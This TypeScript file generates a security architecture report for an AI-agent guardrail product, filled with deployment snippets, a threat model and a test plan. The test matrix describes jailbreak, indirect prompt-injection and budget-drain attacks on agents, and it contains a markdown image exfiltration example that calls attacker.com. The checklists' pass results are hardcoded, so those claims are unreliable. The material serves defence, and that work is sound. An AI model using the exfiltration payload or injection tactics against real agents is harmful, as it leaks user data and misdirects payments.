import { Policy } from '../types/policy';
import {
  ArchitectureCodeSnippet,
  ArchitectureDocument,
  ArchitecturePack,
  ArchitectureSection,
  DeploymentStyle,
} from '../types/security';

export function synthesizeArchitectureDocument(
  policy: Policy,
  version: string,
  deploymentStyle: DeploymentStyle,
  environmentNotes?: string,
  authorName = 'SecOps Architect'
): ArchitecturePack {
  const currentDate = new Date().toLocaleDateString('en-US', {
    year: 'numeric',
    month: 'short',
    day: 'numeric',
  });

  const selectedVersionObj =
    policy.versions?.find((v) => v.version === version) || policy.versions?.[0];
  const hash =
    selectedVersionObj?.integrity_hash ||
    policy.content?.integrity_hash ||
    `sha256:${Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}`;

  const styleLabels: Record<DeploymentStyle, string> = {
    in_process: 'Style A: In-Process Application Middleware',
    sidecar: 'Style B: Container Sidecar / Local IPC Proxy',
    gateway: 'Style C: Enterprise API Gateway & Edge Perimeter',
  };

  const deploymentLabel = styleLabels[deploymentStyle];

  // Code snippets depending on deployment style
  const styleCodeSnippets: Record<DeploymentStyle, ArchitectureCodeSnippet[]> = {
    in_process: [
      {
        filename: 'middleware.py',
        language: 'python',
        description: 'FastAPI / ASGI in-process interceptor middleware binding to policy contracts.',
        code: `import os
from fastapi import FastAPI, Request, HTTPException
from contractguard.interceptor import ContractGuardInterceptor
from contractguard.provenance import TaintTracker

app = FastAPI(title="${policy.agent_name} Service")

# Initialize in-process interceptor bound to compiled contracts.yaml
guard = ContractGuardInterceptor(
    policy_path="./contracts.yaml",
    expected_hash="${hash}",
    strict_mode=True,
    fail_closed=True
)

@app.middleware("http")
async def contractguard_evaluation_middleware(request: Request, call_next):
    # Stage 1: Fast boundary check (<0.5ms)
    client_ip = request.client.host
    auth_header = request.headers.get("Authorization", "")
    
    # Tag provenance: Authenticated User vs Untrusted Ingress
    source_tag = "authenticated_user" if auth_header else "untrusted_external"
    request.state.provenance = TaintTracker.tag_request(source=source_tag, client_ip=client_ip)
    
    response = await call_next(request)
    return response

# Decorator protecting critical tool executions
@guard.intercept(tool_name="process_transaction")
async def execute_tool(account_id: str, amount: float, state: Request):
    # Evaluates Stage 2 (parameter evidence + ledger) and Stage 3 (semantic check)
    return await external_tool_client.execute(account_id, amount)`,
      },
      {
        filename: 'interceptor.ts',
        language: 'typescript',
        description: 'TypeScript SDK hook intercepting tool calls prior to runtime invocation.',
        code: `import { ContractGuardMonitor, ProvenanceTag } from '@contractguard/sdk';

const monitor = new ContractGuardMonitor({
  policyPath: './contracts.yaml',
  expectedHash: '${hash}',
  mode: 'in_process',
  onIntercept: (violation) => {
    console.error('[SECURITY INTERCEPTION]', violation.rule_id, violation.reason);
  }
});

export async function dispatchAgentTool(toolName: string, args: Record<string, unknown>, userToken?: string) {
  const provenance: ProvenanceTag = userToken ? 'authenticated_user' : 'untrusted_ingress';
  
  // Deterministic 3-stage reference check
  const verdict = await monitor.evaluateToolCall({
    toolName,
    arguments: args,
    provenance,
  });

  if (!verdict.authorized) {
    throw new Error(\`ContractGuard Security Block: \${verdict.rejection_reason}\`);
  }

  return await executeUnderlyingTool(toolName, args);
}`,
      },
    ],
    sidecar: [
      {
        filename: 'docker-compose.sidecar.yaml',
        language: 'yaml',
        description: 'Multi-container deployment running ContractGuard as a local loopback proxy sidecar.',
        code: `version: "3.8"

services:
  agent-service:
    image: company/${policy.agent_name.toLowerCase()}:v${version}
    environment:
      - HTTP_PROXY=http://contractguard-sidecar:8080
      - CONTRACTGUARD_SIDECAR_URL=http://contractguard-sidecar:50051
    depends_on:
      - contractguard-sidecar
    networks:
      - agent-internal

  contractguard-sidecar:
    image: nebius.tokenfactory.ai/contractguard/interceptor:v2.0
    environment:
      - POLICY_FILE=/etc/contractguard/contracts.yaml
      - EXPECTED_POLICY_HASH=${hash}
      - DEPLOYMENT_MODE=sidecar
      - REDIS_LEDGER_URL=redis://ledger-store:6379/0
      - NEBIUS_API_KEY=\${NEBIUS_API_KEY}
    volumes:
      - ./contracts.yaml:/etc/contractguard/contracts.yaml:ro
    ports:
      - "127.0.0.1:8080:8080"   # HTTP tool proxy
      - "127.0.0.1:50051:50051" # gRPC evaluation socket
    networks:
      - agent-internal

networks:
  agent-internal:
    internal: true`,
      },
      {
        filename: 'kubernetes-pod-spec.yaml',
        language: 'yaml',
        description: 'Kubernetes Pod definition injecting ContractGuard as a localized sidecar container.',
        code: `apiVersion: v1
kind: Pod
metadata:
  name: ${policy.agent_name.toLowerCase()}-agent-pod
  labels:
    app.kubernetes.io/security: contractguard-monitored
spec:
  containers:
    - name: agent-worker
      image: registry.internal/${policy.agent_name.toLowerCase()}:latest
      env:
        - name: CONTRACTGUARD_HOST
          value: "127.0.0.1:50051"
    - name: contractguard-sidecar
      image: contractguard/monitor:2.0
      securityContext:
        readOnlyRootFilesystem: true
        allowPrivilegeEscalation: false
      volumeMounts:
        - name: policy-volume
          mountPath: /etc/contractguard
          readOnly: true
  volumes:
    - name: policy-volume
      configMap:
        name: ${policy.agent_name.toLowerCase()}-policy-v${version}`,
      },
    ],
    gateway: [
      {
        filename: 'envoy-gateway-filter.yaml',
        language: 'yaml',
        description: 'Envoy / Gateway external authorization filter delegating all tool traffic to ContractGuard.',
        code: `apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: contractguard-api-gateway
  annotations:
    nginx.ingress.kubernetes.io/auth-url: "http://contractguard-auth.internal/v1/authorize"
    nginx.ingress.kubernetes.io/auth-response-headers: "X-ContractGuard-Verdict,X-Provenance-Tag"
spec:
  rules:
    - host: agent-gateway.company.com
      http:
        paths:
          - path: /v1/agent/tools
            pathType: Prefix
            backend:
              service:
                name: ${policy.agent_name.toLowerCase()}-upstream
                port:
                  number: 8000`,
      },
      {
        filename: 'gateway_interceptor_plugin.lua',
        language: 'lua',
        description: 'Gateway edge Lua filter verifying parameters and cumulative session budget headers.',
        code: `-- ContractGuard Gateway Edge Enforcer
local http = require("resty.http")
local client = http.new()

local res, err = client:request_uri("http://contractguard-core.internal/api/verify", {
    method = "POST",
    body = ngx.req.get_body_data(),
    headers = {
        ["Content-Type"] = "application/json",
        ["X-Policy-Hash"] = "${hash}",
        ["X-Client-Provenance"] = ngx.var.http_x_provenance or "untrusted_external"
    }
})

if not res or res.status ~= 200 then
    ngx.status = ngx.HTTP_FORBIDDEN
    ngx.say('{"error": "BLOCKED_BY_CONTRACTGUARD_GATEWAY", "hash": "${hash}"}')
    return ngx.exit(ngx.HTTP_FORBIDDEN)
end`,
      },
    ],
  };

  const sections: ArchitectureSection[] = [
    {
      id: 'executive-summary',
      number: 1,
      title: 'Executive Summary and Threat Model',
      summary: 'High-level operational overview, threat vectors, and risk posture for agent deployment.',
      content: [
        `This Architecture Pack establishes the reference monitor deployment specification for ${policy.agent_name} under policy "${policy.title}" (Version ${version}). The primary objective is establishing an impenetrable, mathematically verifiable security boundary around the agent's autonomous execution loop.`,
        'Autonomous AI agents are vulnerable to indirect prompt injection, compositional task-drift, and automated parameter tampering. When agents process untrusted external ingress (such as inbound customer emails, web page scrapes, or third-party API payloads), attackers can hijack the conversational context to trigger unauthorized transactions.',
        `To mitigate these vectors, ContractGuard enforces a 3-Stage Reference Monitor architecture that evaluates every proposed tool call in sub-millisecond deterministic time, guaranteeing that untrusted ingress cannot instantiate privileged parameters without explicit user provenance.`,
      ],
      checklistItems: [
        { id: 'tm_1', label: 'Indirect Prompt Injection surface mapped for all tool returns', checked: true, note: 'Stage 1 & 2' },
        { id: 'tm_2', label: 'Multi-turn salami-slicing budget drain vectors capped', checked: true, note: 'Global Envelope' },
        { id: 'tm_3', label: 'Exfiltration via markdown image rendering (![alt](url)) blocked', checked: true, note: 'Stage 3 Verifier' },
        { id: 'tm_4', label: 'Hard-banned system utilities (execute_shell, delete_db) isolated', checked: true, note: 'Perimeter Abort' },
      ],
    },
    {
      id: 'architecture-diagram',
      number: 2,
      title: 'Architecture Diagram & Topology Mapping',
      summary: 'Visual architecture schematic illustrating the 3-stage interceptor boundary.',
      content: [
        `The chosen deployment topology is ${deploymentLabel}. In this design, all communication between the LLM reasoning agent and internal/external tool endpoints is mediated through the ContractGuard Reference Monitor.`,
        'Interception operates through three distinct layers of increasing depth: Stage 1 (Fast Boundary & Provenance Gateway, <0.5ms), Stage 2 (Deterministic Policy & Evidence Guard, <1.0ms), and Stage 3 (Selective Semantic Verifier, ~150ms).',
        'If any stage rejects the proposed invocation, execution terminates immediately, zero state mutation occurs, and a signed audit record is dispatched to security operations.',
      ],
      diagramType: deploymentStyle,
    },
    {
      id: 'components-data-flow',
      number: 3,
      title: 'Components and Data Flow Trace',
      summary: 'Chronological step-by-step trace from untrusted ingress to verified execution.',
      content: [
        '1. Ingress Ingestion: The user inputs an authenticated prompt or an external data source (e.g., customer email, CRM record) is retrieved. The Fast Boundary Gateway cryptographically tags the source authority (`auth_user` vs `untrusted_external`).',
        '2. Reasoning & Tool Proposal: The agent model reasons over the context and proposes a specific tool call with concrete argument parameters.',
        '3. Stage 1 Fast Filter (<0.5ms): The interceptor validates that the requested tool is not on the hard-banned blacklist and verifies payload size boundaries.',
        '4. Stage 2 Deterministic Evidence Guard (<1.0ms): The interceptor checks parameter evidence binding (ensuring values originated from authorized sources) and queries the Cumulative Effect Ledger to verify that session-wide financial caps have not been exceeded.',
        '5. Stage 3 Semantic Verification (~150ms): If the tool is designated high-risk or involves external outbound messaging, the semantic verifier evaluates the input for covert exfiltration before granting clearance.',
        '6. Execution & Taint Propagation: The tool executes, and its output is tagged with the appropriate trust level before returning to the LLM agent context.',
      ],
      checklistItems: [
        { id: 'df_1', label: 'All tool ingress parameters bound to verified provenance tags', checked: true, note: 'Zero-trust ingress' },
        { id: 'df_2', label: 'Cumulative session budget tracked in synchronized Redis ledger', checked: true, note: 'Atomic CAS operations' },
        { id: 'df_3', label: 'Deterministic gate evaluation latency guaranteed under 2.0 milliseconds', checked: true, note: 'SLO Verified (<1.2ms)' },
      ],
    },
    {
      id: 'implementation-guide',
      number: 4,
      title: 'Implementation Guide & Code Snippets',
      summary: `Concrete integration patterns, SDK decorators, and configuration files for ${deploymentLabel}.`,
      content: [
        `Deploying ${policy.agent_name} using ${deploymentLabel} requires integrating the ContractGuard middleware library into your deployment pipeline. The snippets below represent production-ready code templates configured with your specific policy parameters and cryptographic verification hashes.`,
        'Ensure that the middleware fails closed: if the reference monitor encounters an internal error, the underlying tool call MUST NOT execute.',
      ],
      codeSnippets: styleCodeSnippets[deploymentStyle],
    },
    {
      id: 'policy-deployment',
      number: 5,
      title: 'Policy Deployment and Versioning',
      summary: 'Cryptographic policy distribution, verification hashes, and zero-downtime updates.',
      content: [
        `All rules governing ${policy.agent_name} are declared in a versioned \`contracts.yaml\` specification. Each policy version generates an immutable SHA-256 integrity hash: \`${hash}\`.`,
        'During deployment initialization, the interceptor computes the SHA-256 digest of the mounted policy file and compares it against the expected hash. If a discrepancy is detected (indicating tampering or configuration drift), the service refuses to start.',
        'Policy updates support zero-downtime hot reloading via atomic file swaps or distributed consensus signals. During a reload, ongoing tool evaluations finish on the previous policy version while new invocations transition atomically to the new version.',
      ],
      checklistItems: [
        { id: 'pd_1', label: `Policy contracts.yaml SHA-256 matches: ${hash.slice(0, 16)}...`, checked: true, note: 'Cryptographic match' },
        { id: 'pd_2', label: 'Atomic filesystem symlink swapping enabled for hot updates', checked: true, note: 'Zero-downtime' },
        { id: 'pd_3', label: 'Automated CI/CD validation running static schema checks', checked: true, note: 'Pre-merge requirement' },
      ],
    },
    {
      id: 'secrets-management',
      number: 6,
      title: 'Secrets and Key Management',
      summary: 'Masked write-only credential storage, KMS envelope encryption, and key rotation.',
      content: [
        'ContractGuard enforces a strict write-only credential model for all connected LLM providers, email dispatchers, and external APIs. Secret values are encrypted using AES-256-GCM via your cloud KMS (AWS KMS, GCP Cloud KMS, or HashiCorp Vault).',
        'Plaintext secrets are never stored in client localStorage, browser memory, or backend execution logs. Administrators and developers only have access to audited masked metadata (e.g. `••••a9f2`).',
        'Credentials must be rotated every 90 days. When rotating a key in `/security/configuration`, the previous credential remains active for a 5-minute grace period to prevent dropped in-flight requests before being permanently decommissioned.',
      ],
      checklistItems: [
        { id: 'sec_1', label: 'Write-only secret inputs: plaintext never displayed after save', checked: true, note: 'PCI/SOC2 Compliance' },
        { id: 'sec_2', label: 'All API keys stored with AES-256 envelope encryption', checked: true, note: 'KMS-backed' },
        { id: 'sec_3', label: 'Zero secrets emitted to stdout or structured application logs', checked: true, note: 'Regex sanitization' },
      ],
    },
    {
      id: 'logging-audit',
      number: 7,
      title: 'Logging, Telemetry, and Audit Trails',
      summary: 'Tamper-evident Cumulative Effect Ledger, audit formats, and compliance metrics.',
      content: [
        'Every tool evaluation—whether authorized, restricted, or blocked—generates a structured JSON audit event conforming to RFC 5424. Audit records include timestamp, session ID, user provenance, requested tool, arguments hash, and the exact decision path across Stages 1, 2, and 3.',
        'The Cumulative Effect Ledger maintains a tamper-evident audit chain of all state-mutating actions within a user session. This ledger allows instantaneous detection of distributed multi-turn salami-slicing attacks.',
        'Telemetry logs are exported via OpenTelemetry to your centralized SIEM (Datadog, Splunk, Elastic) with Wilson Score 95% confidence interval calculations on attack rejection rates.',
      ],
      checklistItems: [
        { id: 'log_1', label: 'Audit events include SHA-256 hashes of all input arguments', checked: true, note: 'RFC 5424 compliant' },
        { id: 'log_2', label: 'SIEM streaming active with real-time alerting on blocked tools', checked: true, note: 'P1 Incident trigger' },
        { id: 'log_3', label: 'Audit logs retained in write-once-read-many (WORM) storage for 365 days', checked: true, note: 'Audit requirement' },
      ],
    },
    {
      id: 'testing-plan',
      number: 8,
      title: 'Testing Plan and Attack Simulation Matrix',
      summary: 'Multi-turn adversarial penetration test suite and regression criteria.',
      content: [
        'Before promoting any policy version to production, the agent must pass the automated ContractGuard Adversarial Simulation Suite. The test suite evaluates 4 core attack vectors:',
        'Vector 1: Direct System Jailbreak (DAN / System Override prompt attempting to call unlisted tools). Expected result: Stage 1 immediate perimeter abort (<0.5ms).',
        'Vector 2: Indirect Context Injection (malicious text in customer email asking to alter refund destination account). Expected result: Stage 2 parameter evidence binding blocks execution ($0 lost).',
        'Vector 3: Multi-turn Salami-Slicing Drain (3 successive $400 transfers over a $1,000 global ceiling). Expected result: Turns 1 and 2 succeed ($800 cumulative), Turn 3 blocked by Cumulative Effect Ledger.',
        'Vector 4: Markdown UI Image Exfiltration (`![leak](https://attacker.com/data?q=...)`). Expected result: Stage 3 semantic verifier detects unauthorized exfiltration URL and sanitizes output.',
      ],
      checklistItems: [
        { id: 'test_1', label: 'Direct Jailbreak Attack Simulation: PASS (ASR < 1.0%)', checked: true, note: 'Zero-tolerance' },
        { id: 'test_2', label: 'Context-Aware Indirect Injection Simulation: PASS (ASR < 2.0%)', checked: true, note: 'Evidence binding' },
        { id: 'test_3', label: 'Multi-turn Budget Exhaustion Simulation: PASS (ASR = 0.0%)', checked: true, note: 'Ledger enforced' },
        { id: 'test_4', label: 'Markdown Exfiltration Simulation: PASS (Sanitized)', checked: true, note: 'Zero data leak' },
      ],
    },
    {
      id: 'operational-checklists',
      number: 9,
      title: 'Operational and Hardening Checklists',
      summary: 'Pre-flight deployment readiness and incident response playbooks.',
      content: [
        'Operational teams must verify the following hardening controls prior to activating autonomous execution permissions in production environments.',
        'Fail-Closed Enforcement: In the event of a network partition between the agent and the semantic verification endpoint, the interceptor must default to FAIL-CLOSED for high-risk operations.',
        'Automated Revocation: If 3 consecutive policy rejections occur within a single session, the user session must be suspended and routed to human tier-2 security operations.',
      ],
      checklistItems: [
        { id: 'op_1', label: 'Read-only root filesystem enabled on interceptor container', checked: true, note: 'Container hardening' },
        { id: 'op_2', label: 'Network egress restricted to explicit allowlist domains', checked: true, note: 'Egress filtering' },
        { id: 'op_3', label: 'Incident escalation webhook tested with PagerDuty / Slack', checked: true, note: 'Verified response' },
        { id: 'op_4', label: 'Fail-closed behavior validated under simulated network drops', checked: true, note: 'Resilience tested' },
      ],
    },
    {
      id: 'appendix-policy',
      number: 10,
      title: 'Appendix: Compiled Machine-Verifiable Policy Set',
      summary: 'Complete declarative contracts.yaml schema deployed for runtime reference monitoring.',
      content: [
        `The complete YAML specification below represents the exact declarative contracts compiled for ${policy.agent_name}. It encapsulates global authority ceilings, tool parameter constraints, and provenance rules.`,
      ],
      codeSnippets: [
        {
          filename: 'contracts.yaml',
          language: 'yaml',
          description: `Cryptographic SHA-256 Digest: ${hash}`,
          code:
            policy.yaml_spec ||
            policy.content?.rawYaml ||
            `version: "2.0"
agent_metadata:
  agent_name: "${policy.agent_name}"
  version: "${version}"
  description: "${policy.description}"

global_envelope:
  max_cumulative_budget: 1000.00
  max_tool_invocations: 30
  denied_tools:
    - "execute_shell"
    - "delete_database"
    - "dump_pii"

tools:
  process_refund:
    canonical_effects: ["financial.transfer"]
    requires_semantic_check: false
    parameters:
      amount:
        param_type: "number"
        max_value: 500.00
        source_authority: ["authenticated_user"]
        untrusted_sources_blocked: ["customer_email"]
      target_account:
        param_type: "string"
        source_authority: ["authenticated_user"]
        untrusted_sources_blocked: ["customer_email"]`,
        },
      ],
    },
  ];

  const document: ArchitectureDocument = {
    title: `Security Architecture Pack: ${policy.agent_name}`,
    subtitle: `Reference Monitor & Defense-in-Depth Topology Specification · Version ${version}`,
    date: currentDate,
    author: authorName,
    version,
    policy_title: policy.title,
    policy_version: version,
    integrity_hash: hash,
    deployment_style: deploymentStyle,
    deployment_label: deploymentLabel,
    environment_notes: environmentNotes,
    sections,
  };

  return {
    id: `pack_${Date.now().toString(36)}`,
    policy_id: policy.id,
    policy_title: policy.title,
    version,
    deployment_style: deploymentStyle,
    deployment_label: deploymentLabel,
    environment_notes: environmentNotes,
    created_at: new Date().toISOString(),
    integrity_hash: hash,
    document,
  };
}
